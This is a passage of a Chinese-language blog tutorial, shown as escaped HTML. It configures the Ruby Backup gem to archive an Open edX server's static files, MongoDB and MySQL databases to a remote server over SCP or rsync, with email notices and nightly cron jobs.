    &lt;span class="n"&gt;archive&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/home/USERNAME&amp;quot;&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;# SCP (Secure Copy) [Storage]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;store_with&lt;/span&gt; &lt;span class="no"&gt;SCP&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_username&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_password&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;         &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;123.45.678.90&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;~/backup_my_home/&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keep&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;# Gzip [Compressor]&lt;/span&gt;
  &lt;span class="n"&gt;compress_with&lt;/span&gt; &lt;span class="no"&gt;Gzip&lt;/span&gt;

&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;几乎无需解释对吧:)&lt;/p&gt;
&lt;p&gt;开始备份:&lt;code&gt;backup perform -t backup_my_home&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;开始备份edX&lt;/h1&gt;
&lt;h2&gt;静态文件&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;backup generate:model --trigger edx_staticfile_backup \
  --archives --storages=&amp;#39;scp&amp;#39;  --compressor=&amp;#39;gzip&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="no"&gt;Model&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:edx_staticfile_backup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Description for edx_staticfile_backup&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;


  &lt;span class="c1"&gt;#   archive.root &amp;#39;/path/to/archive/root&amp;#39;&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;archive&lt;/span&gt; &lt;span class="ss"&gt;:my_archive&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;archive&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="c1"&gt;# Run the `tar` command using `sudo`&lt;/span&gt;
    &lt;span class="c1"&gt;# archive.use_sudo&lt;/span&gt;
    &lt;span class="c1"&gt;#archive.add &amp;quot;/path/to/a/file.rb&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;archive&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/edx/var/edxapp/staticfiles&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#archive.exclude &amp;quot;/path/to/a/excluded_file.rb&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#archive.exclude &amp;quot;/path/to/a/excluded_folder&amp;quot;&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;


  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# SCP (Secure Copy) [Storage]&lt;/span&gt;
  &lt;span class="c1"&gt;#你需要先去目标服务器建立~/edx_backups/staticfile目录&lt;/span&gt;
  &lt;span class="n"&gt;store_with&lt;/span&gt; &lt;span class="no"&gt;SCP&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_username&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_password&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;         &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;123.45.678.90&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;~/edx_backups/staticfile&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keep&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;

    &lt;span class="c1"&gt;# Additional options for the SSH connection.&lt;/span&gt;
    &lt;span class="c1"&gt;# server.ssh_options = {}&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# Gzip [Compressor]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;compress_with&lt;/span&gt; &lt;span class="no"&gt;Gzip&lt;/span&gt; 

&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;备份mongo&lt;/h2&gt;
&lt;h2&gt;databases&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;mongo
&amp;gt;show dbs
admin                            
cs_comments_service_development  
edxapp                           
local                            
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;为mongo添加用户&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;mongo
&amp;gt;use edxapp
&amp;gt;db.addUser(“wwj”, “xxx”)
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;backup generate:model --trigger edx_mongodb_backup \
  --databases=&amp;quot;mongodb&amp;quot; --storages=&amp;#39;scp&amp;#39;  --compressor=&amp;#39;gzip&amp;#39; --notifiers=&amp;#39;mail&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="no"&gt;Model&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:edx_mongodb_backup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Description for edx_mongodb_backup&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# MongoDB [Database]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="no"&gt;MongoDB&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;              &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edxapp&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#db.name                        = :all&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;27017&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ipv6&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;false&lt;/span&gt;
    &lt;span class="c1"&gt;#db.only_collections   = [&amp;quot;only&amp;quot;, &amp;quot;these&amp;quot;, &amp;quot;collections&amp;quot;]&lt;/span&gt;
    &lt;span class="c1"&gt;#db.additional_options = []&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lock&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;false&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;oplog&lt;/span&gt;              &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;false&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# SCP (Secure Copy) [Storage]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;store_with&lt;/span&gt; &lt;span class="no"&gt;SCP&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_username&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_password&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;         &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;123.45.678.90&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;~/edx_backups/mongo&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keep&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;

    &lt;span class="c1"&gt;# Additional options for the SSH connection.&lt;/span&gt;
    &lt;span class="c1"&gt;# server.ssh_options = {}&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# Gzip [Compressor]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;compress_with&lt;/span&gt; &lt;span class="no"&gt;Gzip&lt;/span&gt;

  &lt;span class="n"&gt;notify_by&lt;/span&gt; &lt;span class="no"&gt;Mail&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;on_success&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;on_warning&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;on_failure&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;

    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;                 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sender@email.com&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;                   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;receiver@email.com&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;              &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;smtp.gmail.com&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;                 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;587&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;domain&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;your.host.name&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user_name&lt;/span&gt;            &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sender@email.com&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;             &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_password&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;authentication&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;plain&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encryption&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;:starttls&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;备份mysql&lt;/h2&gt;
&lt;h3&gt;databases&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;text
&amp;gt;mysql -u root
&amp;gt;show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| edxapp             |
| mysql              |
| ora                |
| performance_schema |
| test               |
| xqueue             |
+--------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;backup generate:model --trigger edx_mysql_backup \
  --databases=&amp;quot;mysql&amp;quot; --storages=&amp;#39;scp&amp;#39;  --compressor=&amp;#39;gzip&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;

&lt;span class="no"&gt;Model&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:edx_mysql_backup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Description for edx_mysql_backup&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# MySQL [Database]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="no"&gt;MySQL&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="c1"&gt;# To dump all databases, set `db.name = :all` (or leave blank)&lt;/span&gt;
    &lt;span class="c1"&gt;#db.name              = &amp;quot;my_database_name&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edxapp&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;root&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3306&lt;/span&gt;
    &lt;span class="c1"&gt;#mysql.sock  位置有变&lt;/span&gt;
    &lt;span class="c1"&gt;#db.socket             = &amp;quot;/tmp/mysql.sock&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;# Note: when using `skip_tables` with the `db.name = :all` option,&lt;/span&gt;
    &lt;span class="c1"&gt;# table names should be prefixed with a database name.&lt;/span&gt;
    &lt;span class="c1"&gt;# e.g. [&amp;quot;db_name.table_to_skip&amp;quot;, ...]&lt;/span&gt;
    &lt;span class="c1"&gt;#db.skip_tables        = [&amp;quot;skip&amp;quot;, &amp;quot;these&amp;quot;, &amp;quot;tables&amp;quot;]&lt;/span&gt;
    &lt;span class="c1"&gt;#db.only_tables        = [&amp;quot;only&amp;quot;, &amp;quot;these&amp;quot;, &amp;quot;tables&amp;quot;]&lt;/span&gt;
    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;additional_options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;--quick&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--single-transaction&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# SCP (Secure Copy) [Storage]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;store_with&lt;/span&gt; &lt;span class="no"&gt;SCP&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_username&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;my_password&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;         &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;123.45.678.90&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;~/edx_backups/mysql&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keep&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;

    &lt;span class="c1"&gt;# Additional options for the SSH connection.&lt;/span&gt;
    &lt;span class="c1"&gt;# server.ssh_options = {}&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="c1"&gt;##&lt;/span&gt;
  &lt;span class="c1"&gt;# Gzip [Compressor]&lt;/span&gt;
  &lt;span class="c1"&gt;#&lt;/span&gt;
  &lt;span class="n"&gt;compress_with&lt;/span&gt; &lt;span class="no"&gt;Gzip&lt;/span&gt; 
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;开始备份&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;backup perform -t edx_staticfile_backup
backup perform -t edx_mongodb_backup
backup perform -t edx_mysql_backup
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;定时任务&lt;/h2&gt;
&lt;p&gt;每天凌晨3:00&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo crontab -e&lt;/code&gt;写入&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;00 03 * * * /usr/local/bin/backup perform -t edx_staticfile_backup
00 03 * * * /usr/local/bin/backup perform -t edx_mongodb_backup
00 03 * * * /usr/local/bin/backup perform -t edx_mysql_backup
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;后续&lt;/h1&gt;
&lt;p&gt;之后我们还是采用&lt;a href="http://backup.github.io/backup/v4/storage-rsync/"&gt;rsync&lt;/a&gt;的做法吧，不然数据大到一定程度，太浪费带宽了&lt;/p&gt;
&lt;p&gt;只要更改store_with就行&lt;/p&gt;
&lt;p&gt;注意：数据服务器到备份服务器应当配置好ssh免登陆&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="n"&gt;compress_with&lt;/span&gt; &lt;span class="no"&gt;Gzip&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;gzip&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;gzip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rsyncable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="n"&gt;store_with&lt;/span&gt; &lt;span class="no"&gt;RSync&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;
    &lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;:ssh&lt;/span&gt;
    &lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;123.45.67.89&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
